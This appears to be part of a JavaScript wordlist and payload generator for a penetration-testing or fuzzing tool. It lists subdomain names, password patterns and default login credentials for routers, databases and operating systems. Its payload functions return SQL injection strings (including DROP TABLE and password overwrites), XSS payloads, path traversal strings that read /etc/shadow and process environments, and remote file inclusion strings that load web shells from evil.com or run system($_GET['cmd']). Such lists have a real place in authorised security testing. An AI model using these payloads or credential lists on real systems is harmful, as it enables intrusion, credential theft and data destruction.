        // Development environments
        'test', 'dev', 'staging', 'demo', 'beta', 'alpha',
        'sandbox', 'lab', 'playground', 'preview', 'canary',
        'development', 'testing', 'integration', 'uat', 'qa',
        
        // Mobile and apps
        'mobile', 'm', 'app', 'apps', 'ios', 'android',
        'application', 'client', 'webapp', 'web-app',
        
        // Content delivery
        'cdn', 'static', 'assets', 'media', 'images', 'img',
        'video', 'videos', 'audio', 'download', 'downloads',
        'files', 'backup', 'archive', 'storage', 'data',
        
        // Monitoring and status
        'monitoring', 'status', 'health', 'metrics', 'logs',
        'analytics', 'stats', 'dashboard', 'control',
        'console', 'panel', 'manage', 'management',
        
        // Email services
        'mail1', 'mail2', 'mail3', 'pop', 'imap', 'smtp',
        'exchange', 'outlook', 'webmail1', 'webmail2',
        'mx', 'mx1', 'mx2', 'mx3', 'autoconfig', 'autodiscover',
        
        // Database services
        'db', 'database', 'mysql', 'postgres', 'mongo',
        'redis', 'elastic', 'search', 'solr', 'sphinx',
        'db1', 'db2', 'master', 'slave', 'replica',
        
        // Security services
        'auth', 'login', 'sso', 'oauth', 'saml', 'ldap',
        'identity', 'iam', 'security', 'firewall', 'waf',
        'ssl', 'cert', 'ca', 'pki', 'vpn1', 'vpn2',
        
        // Infrastructure
        'lb', 'load-balancer', 'proxy1', 'proxy2', 'cache',
        'memcache', 'memcached', 'varnish', 'haproxy',
        'nginx', 'apache', 'web1', 'web2', 'web3',
        
        // CI/CD and DevOps
        'ci', 'cd', 'jenkins', 'gitlab', 'github', 'git',
        'build', 'deploy', 'release', 'docker', 'k8s',
        'kubernetes', 'rancher', 'nomad', 'consul',
        
        // Cloud services
        'aws', 'azure', 'gcp', 'cloud', 'compute',
        's3', 'ec2', 'lambda', 'functions', 'serverless',
        
        // Commerce and business
        'shop1', 'shop2', 'cart', 'checkout', 'payment',
        'pay', 'billing', 'invoice', 'order', 'orders',
        'catalog', 'product', 'products', 'inventory',
        
        // Communication
        'chat', 'messenger', 'slack', 'teams', 'zoom',
        'meet', 'conference', 'video', 'voice', 'sip',
        'pbx', 'voip', 'asterisk', 'freeswitch',
        
        // Social and community
        'social', 'community', 'facebook', 'twitter',
        'linkedin', 'instagram', 'youtube', 'reddit',
        'discord', 'telegram', 'whatsapp',
        
        // Regional/Geographic
        'us', 'eu', 'asia', 'na', 'emea', 'apac',
        'east', 'west', 'north', 'south', 'global',
        'local', 'regional', 'country', 'city',
        
        // Numbers and variations
        '1', '2', '3', '01', '02', '03', 'a', 'b', 'c',
        'prod', 'production', 'live', 'public', 'private',
        'internal', 'external', 'partner', 'vendor',
        
        // Special purposes
        'backup1', 'backup2', 'mirror', 'failover',
        'disaster', 'dr', 'redundant', 'cluster',
        'node1', 'node2', 'server1', 'server2',
        
        // Legacy and old
        'old', 'legacy', 'archive1', 'archive2',
        'historical', 'deprecated', 'sunset',
        'maintenance', 'temp', 'temporary'
    ];
}

function getNumericPatterns(min, max) {
    const patterns = [];
    for (let i = min; i <= max; i++) {
        patterns.push('1'.repeat(i));
        patterns.push('0'.repeat(i));
        patterns.push('123456789'.substring(0, i));
        patterns.push('987654321'.substring(0, i));
    }
    return patterns;
}

function getKeyboardPatterns() {
    return [
        'qwerty', 'qwertyuiop', 'asdfgh', 'asdfghjkl', 'zxcvbn', 'zxcvbnm',
        'qwertz', 'azerty', '123qwe', 'qwe123', 'asd123', '123asd',
        'qweasd', 'qweasdzxc', 'adgjmptw', 'aeiou', 'bcdfg'
    ];
}

function generateDatePatterns() {
    const patterns = [];
    const currentYear = new Date().getFullYear();
    
    for (let year = 1980; year <= currentYear; year++) {
        patterns.push(year.toString());
        patterns.push(year.toString().slice(-2));
    }
    
    for (let month = 1; month <= 12; month++) {
        patterns.push(month.toString().padStart(2, '0'));
        patterns.push(month.toString());
    }
    
    for (let day = 1; day <= 31; day++) {
        patterns.push(day.toString().padStart(2, '0'));
    }
    
    return patterns;
}

function generateCharacterCombinations(config) {
    const combinations = [];
    let charset = '';
    
    if (config.lowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (config.uppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (config.numbers) charset += '0123456789';
    if (config.special) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
    
    // Generate limited combinations to avoid memory issues
    for (let i = 0; i < 1000; i++) {
        let combination = '';
        const length = Math.floor(Math.random() * (config.maxLength - config.minLength + 1)) + config.minLength;
        
        for (let j = 0; j < length; j++) {
            combination += charset[Math.floor(Math.random() * charset.length)];
        }
        
        combinations.push(combination);
    }
    
    return combinations;
}

function getRouterCredentials() {
    return [
        // Generic router defaults
        { username: 'admin', password: 'admin', vendor: 'generic' },
        { username: 'admin', password: 'password', vendor: 'generic' },
        { username: 'admin', password: '1234', vendor: 'generic' },
        { username: 'admin', password: '', vendor: 'generic' },
        { username: 'root', password: 'root', vendor: 'generic' },
        { username: 'administrator', password: 'administrator', vendor: 'generic' },
        { username: 'guest', password: 'guest', vendor: 'generic' },
        { username: 'user', password: 'user', vendor: 'generic' },
        { username: 'admin', password: '12345', vendor: 'generic' },
        { username: 'admin', password: '123456', vendor: 'generic' },
        
        // Cisco
        { username: 'admin', password: 'cisco', vendor: 'cisco' },
        { username: 'cisco', password: 'cisco', vendor: 'cisco' },
        { username: 'enable', password: 'cisco', vendor: 'cisco' },
        { username: 'admin', password: 'admin', vendor: 'cisco' },
        { username: 'root', password: 'cisco', vendor: 'cisco' },
        { username: 'cisco', password: 'admin', vendor: 'cisco' },
        { username: 'admin', password: '', vendor: 'cisco' },
        { username: 'cisco', password: '', vendor: 'cisco' },
        
        // Netgear
        { username: 'admin', password: 'netgear1', vendor: 'netgear' },
        { username: 'admin', password: 'password', vendor: 'netgear' },
        { username: 'admin', password: 'admin', vendor: 'netgear' },
        { username: 'admin', password: '1234', vendor: 'netgear' },
        { username: 'admin', password: '', vendor: 'netgear' },
        { username: 'netgear', password: 'netgear', vendor: 'netgear' },
        
        // Linksys
        { username: 'admin', password: 'admin', vendor: 'linksys' },
        { username: 'admin', password: '', vendor: 'linksys' },
        { username: 'admin', password: 'linksys', vendor: 'linksys' },
        { username: 'linksys', password: 'linksys', vendor: 'linksys' },
        { username: 'admin', password: 'password', vendor: 'linksys' },
        { username: 'root', password: 'admin', vendor: 'linksys' },
        
        // D-Link
        { username: 'admin', password: '', vendor: 'dlink' },
        { username: 'admin', password: 'admin', vendor: 'dlink' },
        { username: 'admin', password: 'password', vendor: 'dlink' },
        { username: 'user', password: '', vendor: 'dlink' },
        { username: 'admin', password: 'dlink', vendor: 'dlink' },
        
        // TP-Link
        { username: 'admin', password: 'admin', vendor: 'tplink' },
        { username: 'admin', password: '', vendor: 'tplink' },
        { username: 'admin', password: 'password', vendor: 'tplink' },
        { username: 'admin', password: 'tplink', vendor: 'tplink' },
        { username: 'user', password: 'user', vendor: 'tplink' },
        
        // Asus
        { username: 'admin', password: 'admin', vendor: 'asus' },
        { username: 'admin', password: '', vendor: 'asus' },
        { username: 'admin', password: 'password', vendor: 'asus' },
        { username: 'admin', password: 'asus', vendor: 'asus' },
        { username: 'root', password: 'root', vendor: 'asus' },
        
        // Belkin
        { username: 'admin', password: '', vendor: 'belkin' },
        { username: 'admin', password: 'admin', vendor: 'belkin' },
        { username: 'admin', password: 'belkin', vendor: 'belkin' },
        { username: '', password: 'admin', vendor: 'belkin' },
        
        // SMC
        { username: 'admin', password: 'smcadmin', vendor: 'smc' },
        { username: 'admin', password: 'epicrouter', vendor: 'smc' },
        { username: 'admin', password: 'admin', vendor: 'smc' },
        { username: 'smc', password: 'smc', vendor: 'smc' },
        
        // 3Com
        { username: 'admin', password: 'admin', vendor: '3com' },
        { username: 'admin', password: '', vendor: '3com' },
        { username: 'admin', password: 'comcomcom', vendor: '3com' },
        { username: 'read', password: 'synnet', vendor: '3com' },
        
        // Huawei
        { username: 'admin', password: 'admin', vendor: 'huawei' },
        { username: 'admin', password: '', vendor: 'huawei' },
        { username: 'root', password: 'admin', vendor: 'huawei' },
        { username: 'admin', password: 'huawei', vendor: 'huawei' },
        
        // ZTE
        { username: 'admin', password: 'admin', vendor: 'zte' },
        { username: 'admin', password: '', vendor: 'zte' },
        { username: 'user', password: 'user', vendor: 'zte' },
        { username: 'admin', password: 'zte', vendor: 'zte' },
        
        // Mikrotik
        { username: 'admin', password: '', vendor: 'mikrotik' },
        { username: 'admin', password: 'admin', vendor: 'mikrotik' },
        { username: 'admin', password: 'mikrotik', vendor: 'mikrotik' },
        
        // Ubiquiti
        { username: 'ubnt', password: 'ubnt', vendor: 'ubiquiti' },
        { username: 'admin', password: 'admin', vendor: 'ubiquiti' },
        { username: 'root', password: 'ubnt', vendor: 'ubiquiti' },
        
        // Additional manufacturers
        { username: 'admin', password: 'motorola', vendor: 'motorola' },
        { username: 'admin', password: 'netopia', vendor: 'netopia' },
        { username: 'admin', password: 'speedstream', vendor: 'speedstream' },
        { username: 'admin', password: 'westell', vendor: 'westell' },
        { username: 'admin', password: 'actiontec', vendor: 'actiontec' }
    ];
}

function getDatabaseCredentials() {
    return [
        { username: 'root', password: '', vendor: 'mysql' },
        { username: 'root', password: 'root', vendor: 'mysql' },
        { username: 'root', password: 'password', vendor: 'mysql' },
        { username: 'root', password: 'mysql', vendor: 'mysql' },
        { username: 'mysql', password: 'mysql', vendor: 'mysql' },
        { username: 'admin', password: 'admin', vendor: 'mysql' },
        { username: 'sa', password: '', vendor: 'mssql' },
        { username: 'sa', password: 'sa', vendor: 'mssql' },
        { username: 'sa', password: 'password', vendor: 'mssql' },
        { username: 'postgres', password: '', vendor: 'postgresql' },
        { username: 'postgres', password: 'postgres', vendor: 'postgresql' },
        { username: 'postgres', password: 'password', vendor: 'postgresql' },
        { username: 'oracle', password: 'oracle', vendor: 'oracle' },
        { username: 'system', password: 'oracle', vendor: 'oracle' },
        { username: 'sys', password: 'oracle', vendor: 'oracle' }
    ];
}

function getWebCredentials() {
    return [
        { username: 'admin', password: 'admin', vendor: 'generic' },
        { username: 'admin', password: 'password', vendor: 'generic' },
        { username: 'admin', password: '123456', vendor: 'generic' },
        { username: 'administrator', password: 'administrator', vendor: 'generic' },
        { username: 'root', password: 'root', vendor: 'generic' },
        { username: 'admin', password: 'changeme', vendor: 'generic' },
        { username: 'admin', password: 'letmein', vendor: 'generic' },
        { username: 'guest', password: 'guest', vendor: 'generic' },
        { username: 'user', password: 'user', vendor: 'generic' },
        { username: 'demo', password: 'demo', vendor: 'generic' },
        { username: 'test', password: 'test', vendor: 'generic' }
    ];
}

function getOSCredentials() {
    return [
        { username: 'administrator', password: 'administrator', vendor: 'windows' },
        { username: 'administrator', password: 'admin', vendor: 'windows' },
        { username: 'administrator', password: 'password', vendor: 'windows' },
        { username: 'administrator', password: '123456', vendor: 'windows' },
        { username: 'admin', password: 'admin', vendor: 'windows' },
        { username: 'guest', password: '', vendor: 'windows' },
        { username: 'root', password: 'root', vendor: 'linux' },
        { username: 'root', password: 'password', vendor: 'linux' },
        { username: 'root', password: 'toor', vendor: 'linux' },
        { username: 'root', password: '123456', vendor: 'linux' },
        { username: 'admin', password: 'admin', vendor: 'linux' },
        { username: 'user', password: 'user', vendor: 'linux' }
    ];
}

function getRESTEndpoints() {
    return [
        '/api', '/api/v1', '/api/v2', '/api/v3', '/rest', '/rest/v1',
        '/api/users', '/api/user', '/api/admin', '/api/login', '/api/auth',
        '/api/token', '/api/tokens', '/api/session', '/api/sessions',
        '/api/data', '/api/info', '/api/config', '/api/settings',
        '/api/status', '/api/health', '/api/ping', '/api/version',
        '/api/upload', '/api/download', '/api/files', '/api/documents',
        '/api/search', '/api/query', '/api/filter', '/api/sort',
        '/api/create', '/api/update', '/api/delete', '/api/get',
        '/api/post', '/api/put', '/api/patch', '/api/options',
        '/api/head', '/api/trace', '/api/connect'
    ];
}

function getGraphQLEndpoints() {
    return [
        '/graphql', '/graphql/v1', '/graphql/v2', '/api/graphql',
        '/gql', '/query', '/queries', '/mutation', '/mutations',
        '/subscription', '/subscriptions', '/schema', '/schemas',
        '/graphiql', '/graphql-playground', '/apollo', '/relay'
    ];
}

function getSOAPEndpoints() {
    return [
        '/soap', '/soap/v1', '/soap/v2', '/api/soap', '/webservice',
        '/webservices', '/service', '/services', '/wsdl', '/svc',
        '/asmx', '/asmx/service', '/axis', '/axis2', '/cxf'
    ];
}

function getWebhookEndpoints() {
    return [
        '/webhook', '/webhooks', '/hook', '/hooks', '/callback',
        '/callbacks', '/notify', '/notification', '/notifications',
        '/trigger', '/triggers', '/event', '/events', '/listener',
        '/listeners', '/handler', '/handlers', '/receiver', '/receivers'
    ];
}

function getWordPressPaths() {
    return [
        '/wp-admin/', '/wp-content/', '/wp-includes/', '/wp-login.php',
        '/wp-config.php', '/wp-admin/admin.php', '/wp-admin/index.php',
        '/wp-content/themes/', '/wp-content/plugins/', '/wp-content/uploads/',
        '/wp-includes/js/', '/wp-includes/css/', '/wp-includes/images/',
        '/xmlrpc.php', '/wp-cron.php', '/wp-mail.php', '/wp-settings.php',
        '/wp-blog-header.php', '/wp-comments-post.php', '/wp-trackback.php',
        '/wp-content/debug.log', '/wp-admin/install.php', '/wp-admin/setup-config.php'
    ];
}

function getDrupalPaths() {
    return [
        '/admin/', '/user/', '/node/', '/sites/', '/modules/', '/themes/',
        '/includes/', '/misc/', '/profiles/', '/scripts/', '/install.php',
        '/update.php', '/cron.php', '/xmlrpc.php', '/authorize.php',
        '/sites/default/', '/sites/all/', '/sites/default/files/',
        '/sites/default/settings.php', '/sites/default/default.settings.php'
    ];
}

function getJoomlaPaths() {
    return [
        '/administrator/', '/components/', '/modules/', '/plugins/',
        '/templates/', '/media/', '/cache/', '/logs/', '/tmp/',
        '/configuration.php', '/htaccess.txt', '/web.config.txt',
        '/README.txt', '/LICENSE.txt', '/index.php', '/robots.txt'
    ];
}

function getMagentoPaths() {
    return [
        '/admin/', '/downloader/', '/app/', '/skin/', '/js/', '/media/',
        '/var/', '/lib/', '/shell/', '/api.php', '/cron.php', '/index.php',
        '/app/etc/', '/app/code/', '/app/design/', '/var/log/', '/var/cache/'
    ];
}

function getApachePaths() {
    return [
        '/server-status', '/server-info', '/apache', '/apache2',
        '/httpd', '/cgi-bin/', '/icons/', '/manual/', '/phpmyadmin/',
        '/phpinfo.php', '/test.php', '/info.php', '/php.php'
    ];
}

function getNginxPaths() {
    return [
        '/nginx', '/nginx_status', '/status', '/basic_status',
        '/stub_status', '/health', '/ping', '/metrics'
    ];
}

function getTomcatPaths() {
    return [
        '/manager/', '/manager/html', '/manager/text', '/manager/status',
        '/host-manager/', '/examples/', '/docs/', '/admin/', '/axis/',
        '/axis2/', '/servlet/', '/struts/', '/spring/', '/webdav/'
    ];
}

function getIISPaths() {
    return [
        '/iisadmin/', '/iishelp/', '/iissamples/', '/msadc/', '/scripts/',
        '/certsrv/', '/printers/', '/aspnet_client/', '/exchange/',
        '/exchweb/', '/owa/', '/public/', '/rpc/', '/rpcwithcert/'
    ];
}

function getSQLInjectionPayloads(config) {
    const payloads = [];
    
    if (config.basic) {
        payloads.push(
            // Basic injection attempts
            "'", "''", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
            "' OR 1=1/*", "admin'--", "admin'#", "admin'/*",
            "' OR 'x'='x", "' OR 'a'='a", "' UNION SELECT 1--",
            "1' OR '1'='1", "1' OR 1=1--", "1' OR 1=1#",
            
            // Double quote variations
            '"', '""', '" OR "1"="1', '" OR 1=1--', '" OR 1=1#',
            '" OR "x"="x', '" OR "a"="a', 'admin"--', 'admin"#',
            
            // Numeric injections
            '1 OR 1=1', '1 OR 1=1--', '1 OR 1=1#', '1 OR 1=1/*',
            '1) OR (1=1', '1) OR (1=1--', '1) OR (1=1#',
            
            // Boolean-based
            "' OR 't'='t", "' OR 'test'='test", "' OR 1=1 AND 'a'='a",
            "' OR 1=1 AND 'test'='test", "' OR 1=1 LIMIT 1--"
        );
    }
    
    if (config.advanced) {
        payloads.push(
            // UNION-based injections
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            
            // Time-based blind
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "' AND (SELECT SLEEP(5))--",
            "' OR (SELECT SLEEP(5))--",
            "'; pg_sleep(5)--",
            
            // Error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            
            // Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES(1,'admin','admin')--",
            "'; UPDATE users SET password='admin' WHERE id=1--",
            "'; CREATE TABLE test (id INT)--",
            "'; ALTER TABLE users ADD COLUMN test VARCHAR(255)--",
            
            // Database-specific functions
            "' UNION SELECT @@version,@@hostname,@@datadir--",
            "' UNION SELECT current_user(),current_database(),inet_server_addr()--",
            "' UNION SELECT sqlite_version(),1,1--",
            "' UNION SELECT banner FROM v$version--"
        );
    }
    
    if (config.bypass) {
        payloads.push(
            // Comment variations
            "' /**/OR/**/1=1--", "' %2F%2A%2A%2FOR%2F%2A%2A%2F1=1--",
            "' /*!50000OR*/ 1=1--", "' /*!50000UNION*/ /*!50000SELECT*/ 1--",
            
            // Logical operators
            "' ||'1'='1", "' &&'1'='1", "' |'1'='1", "' &'1'='1",
            "' OR '1'='1' ||'", "' AND '1'='1' &&'",
            
            // Case variations
            "' Or 1=1--", "' oR 1=1--", "' OR 1=1--", "' or 1=1--",
            "' UnIoN SeLeCt 1--", "' uNiOn SeLeCt 1--",
            
            // Whitespace bypass
            "' OR(1)=(1)--", "' OR/**/1=1--", "' OR\t1=1--", "' OR\n1=1--",
            "' OR\r1=1--", "' OR\r\n1=1--", "'/**/OR/**/1=1--",
            
            // Function-based bypass
            "' OR ASCII(SUBSTRING('a',1,1))=97--",
            "' OR CHAR(65)=CHAR(65)--", "' OR 'a'=CHAR(97)--",
            
            // Concatenation bypass
            "' OR 'a'||'b'='ab'--", "' OR CONCAT('a','b')='ab'--",
            "' OR 'a'+'b'='ab'--"
        );
    }
    
    if (config.encoded) {
        payloads.push(
            // URL encoding
            "%27", "%22", "%27%20OR%201=1--", "%27%20OR%20%271%27=%271",
            "%27%20UNION%20SELECT%201--", "%27%20OR%20%27a%27=%27a",
            
            // Double URL encoding
            "%2527", "%2522", "%252527", "%25252527",
            "%2527%2520OR%25201=1--", "%2527%2520UNION%2520SELECT%25201--",
            
            // Unicode encoding
            "%u0027", "%u0022", "%u0027%u0020OR%u00201=1--",
            "%u0027%u0020UNION%u0020SELECT%u00201--",
            
            // HTML entity encoding
            "&#39;", "&#34;", "&#39; OR 1=1--", "&#39; UNION SELECT 1--",
            "&apos;", "&quot;", "&apos; OR 1=1--",
            
            // Hex encoding
            "0x27", "0x22", "0x27204f5220313d312d2d",
            "CHAR(39)", "CHAR(34)", "CHAR(39,32,79,82,32,49,61,49)"
        );
    }
    
    return payloads;
}

function getXSSPayloads(config) {
    const payloads = [];
    
    if (config.basic) {
        payloads.push(
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        );
    }
    
    if (config.advanced) {
        payloads.push(
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<script>Function('a','l','e','r','t','(','1',')')('a','l','e','r','t','(','1',')')</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<script>setInterval('alert(1)',1000)</script>",
            "<script>window['ale'+'rt'](1)</script>",
            "<script>top['ale'+'rt'](1)</script>",
            "<script>parent['ale'+'rt'](1)</script>",
            "<script>self['ale'+'rt'](1)</script>"
        );
    }
    
    if (config.bypass) {
        payloads.push(
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script>alert('XSS')</script>",
            "<script src=//brutelogic.com.br/1.js></script>",
            "<script>alert`XSS`</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert(document.domain)</script>"
        );
    }
    
    if (config.encoded) {
        payloads.push(
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "%3Cimg%20src=x%20onerror=alert('XSS')%3E",
            "%3Csvg%20onload=alert('XSS')%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
        );
    }
    
    return payloads;
}

function getLFIPayloads(config) {
    const payloads = [];
    
    if (config.basic) {
        payloads.push(
            "../../../etc/passwd",
            "../../../etc/hosts",
            "../../../etc/shadow",
            "../../../etc/group",
            "../../../etc/issue",
            "../../../etc/hostname",
            "../../../etc/ssh/ssh_config",
            "../../../etc/ssh/sshd_config",
            "../../../var/log/auth.log",
            "../../../var/log/apache2/access.log",
            "../../../var/log/apache2/error.log",
            "../../../var/log/nginx/access.log",
            "../../../var/log/nginx/error.log",
            "../../../proc/version",
            "../../../proc/cmdline",
            "../../../proc/self/environ"
        );
    }
    
    if (config.advanced) {
        payloads.push(
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "data://text/plain,<?php echo shell_exec('id'); ?>",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://id",
            "file:///etc/passwd",
            "file:///etc/hosts"
        );
    }
    
    if (config.bypass) {
        payloads.push(
            "....//....//....//etc/passwd%00",
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.txt",
            "../../../etc/passwd%00.html",
            "../../../etc/passwd\x00",
            "../../../etc/passwd\x00.jpg"
        );
    }
    
    if (config.encoded) {
        payloads.push(
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts",
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow",
            "%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
        );
    }
    
    return payloads;
}

function getRFIPayloads(config) {
    const payloads = [];
    
    if (config.basic) {
        payloads.push(
            "http://evil.com/shell.php",
            "https://evil.com/shell.php",
            "ftp://evil.com/shell.php",
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "http://pastebin.com/raw/shell",
            "https://pastebin.com/raw/shell",
            "http://evil.com/shell.php?",
            "https://evil.com/shell.php?",
            "http://evil.com/shell.php%00",
            "https://evil.com/shell.php%00"
        );
    }
    
    if (config.advanced) {
        payloads.push(
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "php://input",
            "php://filter/read=convert.base64-encode/resource=http://evil.com/shell.php",
            "expect://id",
            "expect://whoami",
            "expect://ls",
            "expect://cat /etc/passwd"
        );
    }
    
    if (config.bypass) {
        payloads.push(
            "http://evil.com/shell.php%00",
            "https://evil.com/shell.php%00",
            "http://evil.com/shell.php%00.jpg",
            "https://evil.com/shell.php%00.jpg",
            "http://evil.com/shell.php\x00",
            "https://evil.com/shell.php\x00"
        );
    }
    
    if (config.encoded) {
        payloads.push(
            "http%3A%2F%2Fevil.com%2Fshell.php",
            "https%3A%2F%2Fevil.com%2Fshell.php",
            "http%3A//evil.com/shell.php",
            "https%3A//evil.com/shell.php",
            "http%3A%2F%2Fevil.com%2Fshell.php%00",
            "https%3A%2F%2Fevil.com%2Fshell.php%00"
        );
    }
    
    return payloads;
}

// Export for potential module use
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        generateEnumeration,
        generateBruteForce,
        generateCredentials,
        generateUsernames,
        generatePatterns,
        generateHybrid,
        generateAPI,
        generateWebTech,
        generateSecurity
    };
}
